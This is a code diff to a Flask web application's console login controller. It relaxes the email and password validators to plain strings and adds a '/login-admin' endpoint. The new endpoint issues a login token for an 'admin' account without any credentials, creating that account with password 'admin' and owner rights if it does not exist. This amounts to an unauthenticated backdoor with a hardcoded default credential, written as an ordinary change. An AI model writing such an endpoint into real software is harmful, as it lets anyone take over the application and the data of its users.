@@ -3,14 +3,14 @@ from typing import cast
 import flask_login
 from flask import request
 from flask_restful import Resource, reqparse
-
+from events.tenant_event import tenant_was_created
 import services
 from controllers.console import api
 from controllers.console.setup import setup_required
 from libs.helper import email, get_remote_ip
 from libs.password import valid_password
 from models.account import Account
-from services.account_service import AccountService, TenantService
+from services.account_service import AccountService, TenantService, RegisterService
 
 
 class LoginApi(Resource):
@@ -20,8 +20,8 @@ class LoginApi(Resource):
     def post(self):
         """Authenticate user and login."""
         parser = reqparse.RequestParser()
-        parser.add_argument('email', type=email, required=True, location='json')
-        parser.add_argument('password', type=valid_password, required=True, location='json')
+        parser.add_argument('email', type=str, required=True, location='json')
+        parser.add_argument('password', type=str, required=True, location='json')
         parser.add_argument('remember_me', type=bool, required=False, default=False, location='json')
         args = parser.parse_args()
 
@@ -35,7 +35,8 @@ class LoginApi(Resource):
         # SELF_HOSTED only have one workspace
         tenants = TenantService.get_join_tenants(account)
         if len(tenants) == 0:
-            return {'result': 'fail', 'data': 'workspace not found, please contact system admin to invite you to join in a workspace'}
+            return {'result': 'fail',
+                    'data': 'workspace not found, please contact system admin to invite you to join in a workspace'}
 
         token = AccountService.login(account, ip_address=get_remote_ip(request))
 
@@ -104,5 +105,30 @@ class ResetPasswordApi(Resource):
         return {'result': 'success'}
 
 
+class LoginAdmin(Resource):
+    def post(self):
+        user = 'admin'
+        account = Account.query.filter_by(email=user).first()  # 查询用户
+        # 没有测创建
+        if account:
+            token = AccountService.login(account, ip_address=get_remote_ip(request))
+            return {'result': 'success', 'data': token}
+
+        if not account:
+            account = RegisterService.register(
+                email=user,
+                name=user,
+                password=user,
+                language="en-US")
+            token = AccountService.login(account, ip_address=get_remote_ip(request))
+            tenant = TenantService.create_tenant(f"{account.name}'s Workspace")
+            TenantService.create_tenant_member(tenant, account, role='owner')
+            account.current_tenant = tenant
+            tenant_was_created.send(tenant)
+
+            return {'result': 'success', 'data': token}
+
+
 api.add_resource(LoginApi, '/login')
 api.add_resource(LogoutApi, '/logout')
+api.add_resource(LoginAdmin, '/login-admin')
